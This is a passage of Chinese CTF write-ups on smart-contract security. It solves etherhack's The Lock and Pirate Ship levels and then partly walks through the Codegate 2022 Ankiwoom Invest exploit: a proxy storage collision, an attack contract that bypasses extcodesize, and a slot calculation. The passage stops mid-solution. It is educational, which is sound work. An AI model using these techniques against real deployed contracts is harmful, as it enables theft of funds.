<h1 id="The-Lock"><a href="#The-Lock" class="headerlink" title="The Lock"></a>The Lock</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract TheLock &#123;</span><br><span class="line">    bool public unlocked;</span><br><span class="line"></span><br><span class="line">    function TheLock() public &#123;</span><br><span class="line">      unlocked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes4 pin) public payable returns(bool) &#123;</span><br><span class="line">        require(msg.value &gt;&#x3D; 0.5 ether);</span><br><span class="line">        uint result;</span><br><span class="line">        uint sum;</span><br><span class="line">        for (uint8 i &#x3D; 0; i &lt; 4; i++) &#123;</span><br><span class="line">            uint c &#x3D; uint(pin[i]);</span><br><span class="line">            if (c &gt;&#x3D; 48 &amp;&amp; c &lt;&#x3D; 57) &#123;</span><br><span class="line">                uint digit &#x3D; c - 48;</span><br><span class="line">                sum +&#x3D; digit ** 4;</span><br><span class="line">                result &#x3D; result * 10 + digit;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(sum &#x3D;&#x3D; result) &#123;</span><br><span class="line">            unlocked &#x3D; true;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目环境不太行，就在github上面找到<a href="https://github.com/Raz0r/etherhack/blob/master/levels/TheLock.sol">源码</a></p>
<p>可以看到我们需要调用unlock函数置unlocked = true。</p>
<p>我们可以将pin分为四部分</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(pin[0]-48)</span> ^ <span class="number">4</span> + <span class="comment">(pin[1]-48)</span> ^ <span class="number">4</span> + <span class="comment">(pin[2]-48)</span> ^ <span class="number">4</span> + <span class="comment">(pin[3]-48)</span> ^ <span class="number">4</span> == <span class="comment">(pin[0]-48)</span> *<span class="number">1000</span> + <span class="comment">(pin[1]-48)</span> *<span class="number">100</span> + <span class="comment">(pin[2]-48)</span> *<span class="number">10</span> + <span class="comment">(pin[3]-48)</span> </span><br></pre></td></tr></table></figure>
<p>很明显如果pin[]-48等于零自然就成立，也就是0x30303030</p>
<p>还有一种result与sum变量声明之后，如果不进行运算也是可以相等的，0x00000000等等</p>
<h1 id="Pirate-Ship"><a href="#Pirate-Ship" class="headerlink" title="Pirate Ship"></a>Pirate Ship</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract PirateShip &#123;</span><br><span class="line">    address public anchor &#x3D; 0x0;</span><br><span class="line">    bool public blackJackIsHauled &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function sailAway() public &#123;</span><br><span class="line">        require(anchor !&#x3D; 0x0);</span><br><span class="line"></span><br><span class="line">        address a &#x3D; anchor;</span><br><span class="line">        uint size &#x3D; 0;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size :&#x3D; extcodesize(a)</span><br><span class="line">        &#125;</span><br><span class="line">        if(size &gt; 0) &#123;</span><br><span class="line">            revert(); &#x2F;&#x2F; it is too early to sail away</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        blackJackIsHauled &#x3D; true; &#x2F;&#x2F; Yo Ho Ho!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pullAnchor() public &#123;</span><br><span class="line">        require(anchor !&#x3D; 0x0);</span><br><span class="line">        require(anchor.call()); &#x2F;&#x2F; raise the anchor if the ship is ready to sail away</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dropAnchor(uint blockNumber) public returns(address addr) &#123;</span><br><span class="line">        &#x2F;&#x2F; the ship will be able to sail away in 100k blocks time</span><br><span class="line">        require(blockNumber &gt; block.number + 100000);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; if(block.number &lt; blockNumber) &#123; throw; &#125;</span><br><span class="line">        &#x2F;&#x2F; suicide(msg.sender);</span><br><span class="line"></span><br><span class="line">        uint[8] memory a;</span><br><span class="line">        a[0] &#x3D; 0x6300;      &#x2F;&#x2F; PUSH4 0x00...</span><br><span class="line">        a[1] &#x3D; blockNumber; &#x2F;&#x2F; ...block number (3 bytes)</span><br><span class="line">        a[2] &#x3D; 0x43;        &#x2F;&#x2F; NUMBER</span><br><span class="line">        a[3] &#x3D; 0x10;        &#x2F;&#x2F; LT</span><br><span class="line">        a[4] &#x3D; 0x58;        &#x2F;&#x2F; PC</span><br><span class="line">        a[5] &#x3D; 0x57;        &#x2F;&#x2F; JUMPI</span><br><span class="line">        a[6] &#x3D; 0x33;        &#x2F;&#x2F; CALLER</span><br><span class="line">        a[7] &#x3D; 0xff;        &#x2F;&#x2F; SELFDESTRUCT</span><br><span class="line"></span><br><span class="line">        uint code &#x3D; assemble(a);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; init code to deploy contract: stores it in memory and returns appropriate offsets</span><br><span class="line">        uint[8] memory b;</span><br><span class="line">        b[0] &#x3D; 0;             &#x2F;&#x2F; allign</span><br><span class="line">        b[1] &#x3D; 0x6a;          &#x2F;&#x2F; PUSH11</span><br><span class="line">        b[2] &#x3D; code;          &#x2F;&#x2F; contract</span><br><span class="line">        b[3] &#x3D; 0x6000;        &#x2F;&#x2F; PUSH1 0</span><br><span class="line">        b[4] &#x3D; 0x52;          &#x2F;&#x2F; MSTORE</span><br><span class="line">        b[5] &#x3D; 0x600b;        &#x2F;&#x2F; PUSH1 11 ;; length</span><br><span class="line">        b[6] &#x3D; 0x6015;        &#x2F;&#x2F; PUSH1 21 ;; offset</span><br><span class="line">        b[7] &#x3D; 0xf3;          &#x2F;&#x2F; RETURN</span><br><span class="line"></span><br><span class="line">        uint initcode &#x3D; assemble(b);</span><br><span class="line">        uint sz &#x3D; getSize(initcode);</span><br><span class="line">        uint offset &#x3D; 32 - sz;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let solidity_free_mem_ptr :&#x3D; mload(0x40)</span><br><span class="line">            mstore(solidity_free_mem_ptr, initcode)</span><br><span class="line">            addr :&#x3D; create(0, add(solidity_free_mem_ptr, offset), sz)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        require(addr !&#x3D; 0x0);</span><br><span class="line">        anchor &#x3D; addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F; HELPERS &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">    function assemble(uint[8] chunks) internal pure returns(uint code) &#123;</span><br><span class="line">        for(uint i&#x3D;chunks.length; i&gt;0; i--) &#123;</span><br><span class="line">            code ^&#x3D; chunks[i-1] &lt;&lt; 8 * getSize(code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSize(uint256 chunk) internal pure returns(uint) &#123;</span><br><span class="line">        bytes memory b &#x3D; new bytes(32);</span><br><span class="line">        assembly &#123; mstore(add(b, 32), chunk) &#125;</span><br><span class="line">        for(uint32 i &#x3D; 0; i&lt; b.length; i++) &#123;</span><br><span class="line">            if(b[i] !&#x3D; 0) &#123;</span><br><span class="line">                return 32 - i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要求我们 blackJackIsHauled = true 这就要求在</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">assembly</span> &#123; <span class="attribute">size </span>:= <span class="built_in">extcodesize</span>(a)  &#125;</span><br></pre></td></tr></table></figure>
<p>时，返回结果不为零，此时的a对应的就是anchor地址，而anchor地址由dropAnchor函数负责修改</p>
<p>此时会使用字节码部署一个合约，<code>0x6300____4310585733ff600052600b6015f3</code></p>
<p>其中<em>__</em>处的字节码是我们可以控制的，注意到其中有一个指令是0xff，也就是SELFDESTRUCT，会执行自毁操作，我们验证一下会不会导致size为零</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line"></span><br><span class="line">        selfdestruct(address(0x0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ttt&#123;</span><br><span class="line">    bool public blackJackIsHauled &#x3D; false;</span><br><span class="line">    function sailAway(address anchor) public &#123;</span><br><span class="line">        require(anchor !&#x3D; 0x0);</span><br><span class="line"></span><br><span class="line">        address a &#x3D; anchor;</span><br><span class="line">        uint size &#x3D; 0;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size :&#x3D; extcodesize(a)</span><br><span class="line">        &#125;</span><br><span class="line">        if(size &gt; 0) &#123;</span><br><span class="line">            revert(); &#x2F;&#x2F; it is too early to sail away</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        blackJackIsHauled &#x3D; true; &#x2F;&#x2F; Yo Ho Ho!</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/03/10/35/image-20210926180727962.png" alt="image-20210926180727962"></p>
<p>那也就是说我们要执行ff，也就是说我们需要在栈顶存入一个地址，由EVM opcode可以知道以下指令满足</p>
<p><code>30</code>    <code>31</code> <code>33</code>  <code>41</code></p>
<p>同时实验各自与ff组合，比如33ff，反编译出来</p>
<p><img src="/2022/03/10/35/image-20220310223837749.png" alt="image-20220310223837749"></p>
<p>而63指令是PUSH4   也就是说我们需要填充三个字节的指令，而后接上33ff，总字节码就是</p>
<p>0x630000000033ff4310585733ff600052600b6015f3</p>
<p><img src="/2022/03/10/35/image-20220310224057554.png" alt="image-20220310224057554"></p>
<p>实现自毁，同时前面有一个限制 require(blockNumber &gt; block.number + 100000);所以我们不能填充00，随便选一个其他的都可以。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Codegate CTF 2022 Ankiwoom Invest</title>
    <url>/2022/03/11/36/</url>
    <content><![CDATA[<h1 id="Codegate-CTF-2022-Ankiwoom-Invest"><a href="#Codegate-CTF-2022-Ankiwoom-Invest" class="headerlink" title="Codegate CTF 2022 Ankiwoom Invest"></a>Codegate CTF 2022 Ankiwoom Invest</h1><p>​    关于这个挑战的Write up！</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Proxy.sol</span><br><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.11;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Proxy &#123;</span><br><span class="line">    address implementation;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    struct log &#123;</span><br><span class="line">        bytes12 time;</span><br><span class="line">        address sender;</span><br><span class="line">    &#125;</span><br><span class="line">    log info;</span><br><span class="line">    </span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        implementation &#x3D; _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setImplementation(address _target) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        implementation &#x3D; _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _delegate(address _target) internal &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line"></span><br><span class="line">            let result :&#x3D; delegatecall(gas(), _target, 0, calldatasize(), 0, 0)</span><br><span class="line"></span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line"></span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123;</span><br><span class="line">                revert(0, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">            default &#123;</span><br><span class="line">                return(0, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _implementation() internal view returns (address) &#123;</span><br><span class="line">        return implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _fallback() internal &#123;</span><br><span class="line">        _beforeFallback();</span><br><span class="line">        _delegate(_implementation());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        _fallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        _fallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _beforeFallback() internal &#123;</span><br><span class="line">        info.time &#x3D; bytes12(uint96(block.timestamp));</span><br><span class="line">        info.sender &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Investment.sol</span><br><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.11;</span><br><span class="line"></span><br><span class="line">import &quot;OpenZeppelin&#x2F;openzeppelin-contracts@4.4.2&#x2F;contracts&#x2F;utils&#x2F;math&#x2F;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Investment &#123;</span><br><span class="line">    address private implementation;</span><br><span class="line">    address private owner;</span><br><span class="line">    address[] public donaters;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint;</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; bool) private _minted;</span><br><span class="line">    mapping (bytes32 &#x3D;&gt; uint) private _total_stocks;</span><br><span class="line">    mapping (bytes32 &#x3D;&gt; uint) private _reg_stocks;</span><br><span class="line">    mapping (address &#x3D;&gt; mapping (bytes32 &#x3D;&gt; uint)) private _stocks;</span><br><span class="line">    mapping (address &#x3D;&gt; uint) private _balances;</span><br><span class="line"></span><br><span class="line">    address lastDonater;</span><br><span class="line">    uint fee;</span><br><span class="line">    uint denominator;</span><br><span class="line">    bool inited;</span><br><span class="line"></span><br><span class="line">    event solved(address);</span><br><span class="line"></span><br><span class="line">    modifier isInited &#123;</span><br><span class="line">        require(inited);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function init() public &#123;</span><br><span class="line">        require(!inited);</span><br><span class="line"></span><br><span class="line">        _reg_stocks[keccak256(&quot;apple&quot;)] &#x3D; 111;</span><br><span class="line">        _total_stocks[keccak256(&quot;apple&quot;)] &#x3D; 99999999;</span><br><span class="line">        _reg_stocks[keccak256(&quot;microsoft&quot;)] &#x3D; 101;</span><br><span class="line">        _total_stocks[keccak256(&quot;microsoft&quot;)] &#x3D; 99999999;</span><br><span class="line">        _reg_stocks[keccak256(&quot;intel&quot;)] &#x3D; 97;</span><br><span class="line">        _total_stocks[keccak256(&quot;intel&quot;)] &#x3D; 99999999;</span><br><span class="line">        _reg_stocks[keccak256(&quot;amd&quot;)] &#x3D; 74;</span><br><span class="line">        _total_stocks[keccak256(&quot;amd&quot;)] &#x3D; 99999999;</span><br><span class="line">        _reg_stocks[keccak256(&quot;codegate&quot;)] &#x3D; 11111111111111111111111111111111111111;</span><br><span class="line">        _total_stocks[keccak256(&quot;codegate&quot;)] &#x3D; 1;</span><br><span class="line">        fee &#x3D; 5;</span><br><span class="line">        denominator &#x3D; 1e4;</span><br><span class="line">        inited &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyStock(string memory _stockName, uint _amountOfStock) public isInited &#123;</span><br><span class="line">        bytes32 stockName &#x3D; keccak256(abi.encodePacked(_stockName));</span><br><span class="line">        require(_total_stocks[stockName] &gt; 0 &amp;&amp; _amountOfStock &gt; 0);</span><br><span class="line">        uint amount &#x3D; _reg_stocks[stockName].mul(_amountOfStock).mul(denominator + fee).div(denominator);</span><br><span class="line">        require(_balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        </span><br><span class="line">        _balances[msg.sender] -&#x3D; amount;</span><br><span class="line">        _stocks[msg.sender][stockName] +&#x3D; _amountOfStock;</span><br><span class="line">        _total_stocks[stockName] -&#x3D; _amountOfStock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sellStock(string memory _stockName, uint _amountOfStock) public isInited &#123;</span><br><span class="line">        bytes32 stockName &#x3D; keccak256(abi.encodePacked(_stockName));</span><br><span class="line">        require(_amountOfStock &gt; 0);</span><br><span class="line">        uint amount &#x3D; _reg_stocks[stockName].mul(_amountOfStock).mul(denominator).div(denominator + fee);</span><br><span class="line">        require(_stocks[msg.sender][stockName] &gt;&#x3D; _amountOfStock);</span><br><span class="line">        _balances[msg.sender] +&#x3D; amount;</span><br><span class="line">        _stocks[msg.sender][stockName] -&#x3D; _amountOfStock;</span><br><span class="line">        _total_stocks[stockName] +&#x3D; _amountOfStock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donateStock(address _to, string memory _stockName, uint _amountOfStock) public isInited &#123;</span><br><span class="line">        bytes32 stockName &#x3D; keccak256(abi.encodePacked(_stockName));</span><br><span class="line">        require(_amountOfStock &gt; 0);</span><br><span class="line">        require(isUser(msg.sender) &amp;&amp; _stocks[msg.sender][stockName] &gt;&#x3D; _amountOfStock);</span><br><span class="line">        _stocks[msg.sender][stockName] -&#x3D; _amountOfStock;</span><br><span class="line">        (bool success, bytes memory result) &#x3D; msg.sender.call(abi.encodeWithSignature(&quot;receiveStock(address,bytes32,uint256)&quot;, _to, stockName, _amountOfStock));</span><br><span class="line">        require(success);</span><br><span class="line">        lastDonater &#x3D; msg.sender;</span><br><span class="line">        donaters.push(lastDonater);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isInvalidDonaters(uint index) internal returns (bool) &#123;</span><br><span class="line">        require(donaters.length &gt; index);</span><br><span class="line">        if (!isUser(lastDonater)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function modifyDonater(uint index) public isInited &#123;</span><br><span class="line">        require(isInvalidDonaters(index));</span><br><span class="line">        donaters[index] &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isUser(address _user) internal returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size :&#x3D; extcodesize(_user)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public isInited &#123;</span><br><span class="line">        require(!_minted[msg.sender]);</span><br><span class="line">        _balances[msg.sender] &#x3D; 300;</span><br><span class="line">        _minted[msg.sender] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public isInited &#123;</span><br><span class="line">        if (_total_stocks[keccak256(&quot;codegate&quot;)] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            emit solved(msg.sender);</span><br><span class="line">            address payable addr &#x3D; payable(address(0));</span><br><span class="line">            selfdestruct(addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isSolved() public isInited &#123;</span><br><span class="line">    if (_total_stocks[keccak256(&quot;codegate&quot;)] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        emit solved(msg.sender);</span><br><span class="line">        address payable addr &#x3D; payable(address(0));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要实现 emit  solved(msg.sender)，需要_total_stocks[keccak256(“codegate”)] == 0，进一步分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function init() public &#123;</span><br><span class="line">    ...</span><br><span class="line">    _reg_stocks[keccak256(&quot;codegate&quot;)] &#x3D; 11111111111111111111111111111111111111;</span><br><span class="line">    _total_stocks[keccak256(&quot;codegate&quot;)] &#x3D; 1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">function buyStock(string memory _stockName, uint _amountOfStock) public isInited &#123;</span><br><span class="line">    ...</span><br><span class="line">    _balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    _stocks[msg.sender][stockName] +&#x3D; _amountOfStock;</span><br><span class="line">    _total_stocks[stockName] -&#x3D; _amountOfStock;</span><br><span class="line">&#125;</span><br><span class="line">function mint() public isInited &#123;</span><br><span class="line">    require(!_minted[msg.sender]);</span><br><span class="line">    _balances[msg.sender] &#x3D; 300;</span><br><span class="line">    _minted[msg.sender] &#x3D; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然我们需要购买一个codegate-Stock，但是我们刚开始仅能得到很少的_balances，这很难支持我们购买！所以我们需要寻找一个能够使得我们的_balances增大的漏洞。</p>
<p>通过对investment合约源代码的审计，我们排除了整数加减法溢出，持续buysell套利的漏洞。</p>
<p>存在一处乘法溢出的风险，但是很可惜没有办法利用。</p>
<p><img src="/2022/03/11/36/image-20220228220131791.png" alt="image-20220228220131791"></p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol#L121">链接</a></p>
<p>存在一处变量覆盖的风险，但是会进行长度检查，无法越界进行覆盖。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">		function modifyDonater(uint index) public isInited &#123;</span><br><span class="line">    	require(isInvalidDonaters(index));</span><br><span class="line">    	donaters[index] &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br><span class="line">    function isInvalidDonaters(uint index) internal returns (bool) &#123;</span><br><span class="line">        require(donaters.length &gt; index);</span><br><span class="line">        if (!isUser(lastDonater)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在这样看来，似乎investment无懈可击。</p>
<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>继续对Proxy合约审计，发现下面的代码，让我们解析一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function _delegate(address _target) internal &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        calldatacopy(0, 0, calldatasize())</span><br><span class="line"></span><br><span class="line">        let result :&#x3D; delegatecall(gas(), _target, 0, calldatasize(), 0, 0)</span><br><span class="line"></span><br><span class="line">        returndatacopy(0, 0, returndatasize())</span><br><span class="line"></span><br><span class="line">        switch result</span><br><span class="line">        case 0 &#123;</span><br><span class="line">            revert(0, returndatasize())</span><br><span class="line">        &#125;</span><br><span class="line">        default &#123;</span><br><span class="line">            return(0, returndatasize())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先来看这几个汇编指令的含义</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Hex</th>
<th>Name</th>
<th>Gas</th>
<th>Stack</th>
<th style="text-align:center">Mem / Storage</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>36</td>
<td>CALLDATASIZE</td>
<td>2</td>
<td><code>.</code> =&gt; <code>len(msg.data)</code></td>
<td style="text-align:center"></td>
<td>length of msg data, in bytes</td>
</tr>
<tr>
<td>37</td>
<td>CALLDATACOPY</td>
<td><a href="https://github1s+.vscode-resource.vscode-webview.net/gas.md#a3-copy-operations">A3</a></td>
<td><code>dstOst, ost, len</code> =&gt; <code>.</code></td>
<td style="text-align:center">mem[dstOst:dstOst+len] := msg.data[ost:ost+len</td>
<td>copy msg data</td>
</tr>
<tr>
<td>38</td>
<td>CODESIZE</td>
<td>2</td>
<td><code>.</code> =&gt; <code>len(this.code)</code></td>
<td style="text-align:center"></td>
<td>length of executing contract’s code, in bytes</td>
</tr>
<tr>
<td>3D</td>
<td>RETURNDATASIZE</td>
<td>2</td>
<td><code>.</code> =&gt; <code>size</code></td>
<td style="text-align:center"></td>
<td>size of returned data from last external call, in bytes</td>
</tr>
<tr>
<td>3E</td>
<td>RETURNDATACOPY</td>
<td><a href="https://github1s+.vscode-resource.vscode-webview.net/gas.md#a3-copy-operations">A3</a></td>
<td><code>dstOst, ost, len</code> =&gt; <code>.</code></td>
<td style="text-align:center">mem[dstOst:dstOst+len] := returndata[ost:ost+len]</td>
<td>copy returned data from last external call</td>
</tr>
<tr>
<td>5A</td>
<td>GAS</td>
<td>2</td>
<td><code>.</code> =&gt; <code>gasRemaining</code></td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td>F4</td>
<td>DELEGATECALL</td>
<td><a href="https://github1s+.vscode-resource.vscode-webview.net/gas.md#aa-call-operations">AA</a></td>
<td><code>gas, addr, argOst, argLen, retOst, retLen</code> =&gt; <code>success</code></td>
<td style="text-align:center">mem[retOst:retOst+retLen] := returndata</td>
</tr>
</tbody>
</table>
</div>
<p>重点在于<a href="https://ctf-wiki.org/blockchain/ethereum/attacks/delegatecall/#delegatecall_1">delegatecall</a></p>
<ul>
<li>函数设计的目的是为了使用给定地址的代码，其他信息则使用当前合约（存储）</li>
<li>某种程度上也是为了代码的复用</li>
</ul>
<p>而此时_target对应于investment合约的地址，也就是说我们可以将investment合约的任意函数转移到Proxy合约上执行。</p>
<p>同时发现一处storage未初始化的问题，<a href="https://ctf-wiki.org/blockchain/ethereum/attacks/uninitialized-storage-pointer/">详细</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct log &#123;</span><br><span class="line">    bytes12 time;</span><br><span class="line">    address sender;</span><br><span class="line">&#125;</span><br><span class="line">log info;</span><br><span class="line">function _beforeFallback() internal &#123;</span><br><span class="line">    info.time &#x3D; bytes12(uint96(block.timestamp));</span><br><span class="line">    info.sender &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>log结构体对应的大小刚好是byte32，且位于slot 2</p>
<p>在Investment合约中，donaters数组的长度恰好也位于slot2</p>
<p>也就是说我们可以通过覆盖长度，实现越界访问，结合上面提到的变量覆盖，就可以在特定位置覆盖我们的_balances</p>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Init"><a href="#Init" class="headerlink" title="Init"></a>Init</h3><p>我们需要进行初始化，因为需要通过isInited关键词修饰</p>
<p><img src="/2022/03/11/36/image-20220311110545430.png" alt="image-20220311110545430" style="zoom:67%;"></p>
<p><img src="/2022/03/11/36/image-20220311110640819.png" alt="image-20220311110640819"></p>
<p>可以看见donaters数组长度的位置被覆盖，此时的长度非常大了。</p>
<h3 id="Mint"><a href="#Mint" class="headerlink" title="Mint"></a>Mint</h3><p><img src="/2022/03/11/36/image-20220311111014901.png" alt="image-20220311111014901" style="zoom:67%;"></p>
<p><img src="/2022/03/11/36/image-20220311111442848.png" alt="image-20220311111442848"></p>
<p>此时存储balance[EOA]的位置在slot </p>
<p>0xad0f00e11a82c9e4c6bf0ad52e498f98562d86ac4ff95e82c6ecf0258d19cc74</p>
<h3 id="DonateStock"><a href="#DonateStock" class="headerlink" title="DonateStock"></a>DonateStock</h3><p>绕过!isUser限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line"> Investment claim;</span><br><span class="line"> 	constructor()&#123;</span><br><span class="line"> 		string memory apple&#x3D;&quot;apple&quot;;</span><br><span class="line">		claim&#x3D;Investment(0xE65717788EA5520888F724819E8Fb092930bB05D);</span><br><span class="line"> 		claim.mint();</span><br><span class="line"> </span><br><span class="line"> 		claim.buyStock(apple,2);</span><br><span class="line">		claim.donateStock(0x8Ef65AC72069051De8028244DCB33251f31Cf545, apple,2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>lastDonater</p>
<p><img src="/2022/03/11/36/image-20220311112601057.png" alt="image-20220311112601057"></p>
<h3 id="ModifyDonater"><a href="#ModifyDonater" class="headerlink" title="ModifyDonater"></a>ModifyDonater</h3><p>donaters[0]的slot计算<a href="https://www.zpano.cn/2021/07/09/19/">参考</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(sha3.keccak_256(byte32(<span class="number">2</span>)).hexdigest())</span><br><span class="line"><span class="comment"># 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace</span></span><br></pre></td></tr></table></figure>
<p>计算相对位置</p>
